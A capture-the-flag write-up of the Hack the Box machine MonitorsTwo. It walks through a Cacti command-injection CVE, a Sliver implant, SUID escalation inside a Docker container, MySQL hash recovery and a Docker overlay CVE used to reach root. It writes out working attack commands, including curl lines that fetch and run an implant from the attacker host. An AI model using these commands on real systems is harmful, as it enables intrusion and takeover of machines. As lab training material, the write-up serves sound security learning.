---
title: "HTB • MonitorsTwo"
tags:
  - "Beginner"
  - "Linux"
  - "Easy Difficulty"
  - "Web"
  - "Hash Cracking"
  - "MySQL"
  - "Pivoting"
  - "CVE"
  - "Docker"
  - "SUID"
  - "Database"
  - "SQL"
excerpt: "MonitorsTwo is an easy Linux machine on Hack the Box that covers topics including Common Vulnerabilities & Exposures (CVEs), Linux privilege escalation, Docker, SQL, and pivoting"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-monitorstwo/"
---

MonitorsTwo is an easy, Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/MonitorsTwo) machine created by [**TheCyberGeek**](https://app.hackthebox.com/users/114053) that covers topics including Common Vulnerabilities and Exposures (CVEs), Linux privilege escalation, Docker, and pivoting. We initially exploited a vulnerable Cacti installation on the target's web server to establish an implant in a Docker container. From within this container, we found an executable with insecure SUID privileges allowing us to elevate to root. We found the entrypoint program in the container with credentials for a MySQL service. This MySQL server contained a password hash that we were able to crack and use to login to the host machine via SSH. Once logged in, we utilized our privileged access in the Docker container to exploit CVE-2021-41091 and read the root flag.

## Initial Reconnaissance

For the initial reconnaissance phase, we began by setting up our environment and conducting a TCP port scan using a custom nmap wrapper script [from here](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh). This script aids in quickly and reliably scanning for open ports on the target machine.

```zsh
# Set up environment variables and run a port scan
echo rhost="10.10.11.211" >> .env
echo lhost="10.10.14.2" >> .env # Our HTB VPN client IP address
. ./.env && ctfscan $rhost
```
{:file="bryan@red_team ➤ zsh" .nolineno}

Two open ports were identified:

| Transport | Port | Service | Product      | Version                 |
|:----------|:-----|:--------|:-------------|:------------------------|
| TCP       | 22   | SSH     | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.5 |
| TCP       | 80   | HTTP    | nginx        | 1.18.0                  |

## Web Exploitation

The web service running on port 80 was identified as **Cacti 1.2.22**.

![Web index](web-cacti.png)

Using [cvedetails.com](https://www.cvedetails.com/) we were able to find an applicable unauthenticated command injection vulnerability tracked as [**CVE-2022-46169**](https://www.cvedetails.com/cve/CVE-2022-46169/). We then made [a simple exploit script](https://gist.github.com/bryanmcnulty/df8ee3e77bc87c8b31a244e8cbc688cd) based on information from the detailed CVE description.


### Exploitation

We first set up a [Sliver](https://github.com/BishopFox/sliver) listener and generated a compatible implant, then we served the implant over HTTPS.

```shell
mtls -L 10.10.14.2 -l 8443
generate -o linux -m 10.10.14.2:8443 -e -s implant.elf
websites add-content -w monitors-two -c implant.elf -p /u5j7_t
https -L 10.10.14.2 -l 443 -w monitors-two
```
{:file="bryan@red_team ➤ sliver-client" .nolineno}

We used the exploit to download and execute our implant.

```bash
python3 ./CVE-2022-46169.py http://$rhost -c "sh -c 'f=/tmp/ywmkRg;curl https://$lhost/u5j7_t -ko\$f;chmod +x \$f;\$f'"
```
{:file="bryan@red_team ➤ zsh" .nolineno}

## Docker Container

It was determined that we were inside of a Docker container due to the presence of `/.dockerenv`{:.filepath}. With this in mind, we began looking for a path to root within the container.

### Privilege Escalation

While conducting local enumeration, we used `find` to search for executables with the SUID bit from our implant session.

```shell
execute -t 8 -o sh -c 'find / -perm -u=s 2>/dev/null'
```
{:file="bryan@red_team ➤ sliver-client ➤ www-data@50bca5e748b0" .nolineno}

An unusual SUID executable was found at `/sbin/capsh`{:.filepath}. The permissions on this executable were exploited using the technique outlined in [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/) to execute our sliver implant as root.

```shell
execute capsh --uid=0 --gid=0 -- -c /tmp/ywmkRg
```
{:file="bryan@red_team ➤ sliver-client ➤ www-data@50bca5e748b0" .nolineno}

### Privileged Enumeration

Inside the container, the entrypoint script was located at `/entrypoint.sh`{:.filepath}. Credentials for the MySQL root user on _db_ were found in this script.

#### MySQL

We forwarded the remote MySQL service port to localhost for easy access, then used the credentials from `/entrypoint.sh`{:.filepath} to connect.

```shell
portfwd add -b 127.0.0.1:13306 -r db:3306
```
{:file="bryan@red_team ➤ sliver-client ➤ root@50bca5e748b0" .nolineno}
```zsh
# Access MySQL server from forwarded port
mysql --host=127.0.0.1 --port=13306 --user=root --password=$MYSQL_ROOT_PW
```
{:file="bryan@red_team ➤ zsh" .nolineno}

We then found a single non-standard database called "cacti". Since the database was likey related to the Cacti installation on port 80, we inferred that it might store the hashes for each Cacti user.

```sql
show databases; -- "cacti" is the only non-standard db
use cacti; -- We'll work with the cacti db
show tables; -- Found "user_auth" table. Any hashes?
select * from user_auth; -- hashes for user::admin and user::marcus
```
{:file="bryan@red_team ➤ mysql ➤ root@db" .nolineno}

Two users, "admin" and "marcus" existed in the *user_auth* table, each with a corresponding BCrypt hash. We used [hashes.com](https://hashes.com/en/decrypt/hash) to successfully recover the password for _marcus_.

![hashes.com results](container-mysql-bcrypt-hashes.png)

With the username "marcus" and the recovered password, we were able to login to the target via SSH.

## Host Privilege Escalation

First, we'll establish another sliver session, this time on the host system.

```shell
# Establish implant as "marcus"
ssh marcus@$rhost "sh -c 'f=/tmp/9LRZln;curl https://$lhost/u5j7_t -ko\$f;chmod +x \$f;\$f'"
```
{:file="bryan@red_team ➤ zsh" .nolineno}

We initially searched for simple and common privilege escalation routes, but to no evail. Eventually we came across the user mailbox at `/var/mail/marcus`{:.filepath} which held an message detailing a few CVEs possibly affecting the machine.

- CVE-2021-33033: Linux kernel use-after-free vulnerability.
- CVE-2020-25706: Cacti Cross-Site Scripting (XSS) vulnerability.
- CVE-2021-41091: Docker Engine directory traversal and unauthorized program execution.

### CVE-2021-41091

The email mentioned a directory traversal vulnerability affecting Docker Engine tracked as [CVE-2021-41091](https://www.cvedetails.com/cve/CVE-2021-41091/). We studied the CVE description for this vulnerability in search of additional details.

> Moby is an open-source project created by Docker to enable software containerization. A bug was found in Moby (Docker Engine) where the data directory (typically /var/lib/docker) contained subdirectories with insufficiently restricted permissions, allowing otherwise unprivileged Linux users to traverse directory contents and execute programs. **When containers included executable programs with extended permission bits (such as setuid), unprivileged Linux users could discover and execute those programs. When the UID of an unprivileged Linux user on the host collided with the file owner or group inside a container, the unprivileged Linux user on the host could discover, read, and modify those files.** This bug has been fixed in Moby (Docker Engine) 20.10.9. Users should update to this version as soon as possible. Running containers should be stopped and restarted for the permissions to be fixed. For users unable to upgrade limit access to the host to trusted users. Limit access to host volumes to trusted containers.

We ensured that the Docker Engine installation was vulnerable before any exploitation attempts. The installed version was found to be 20.10.5, which is vulnerable to CVE-2021-41091.

```shell
execute -t 5 -o docker --version
```
{:file="bryan@red_team ➤ sliver-client ➤ marcus@monitorstwo" .nolineno}

#### Exploitation

In the root implant session within the Docker container, we added the SUID and SGID bits for `/bin/bash`{:.filepath} as explained in the CVE description.

```shell
chmod /bin/bash 6755
```
{:file="bryan@red_team ➤ sliver-client ➤ root@50bca5e748b0" .nolineno}

On the host filesystem, we located the container's mount point and used the SUID bash executable to spawn another implant session. This new session was marked with the username "marcus", but had effective UID and GID of root. This meant we could still perform privileged actions like reading the root flag at `/root/root.txt`{:.filepath}.

```shell
execute -t 5 -o bash -c 'mount | grep ^overlay | cut -d\  -f3'
ls /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/bin/bash
ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash
execute /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -pc /tmp/9LRZln
```
{:file="bryan@red_team ➤ sliver-client ➤ marcus@monitorstwo" .nolineno}

```shell
cat /root/root.txt
```
{:file="bryan@red_team ➤ sliver-client ➤ marcus@monitorstwo (EUID=0)" .nolineno}
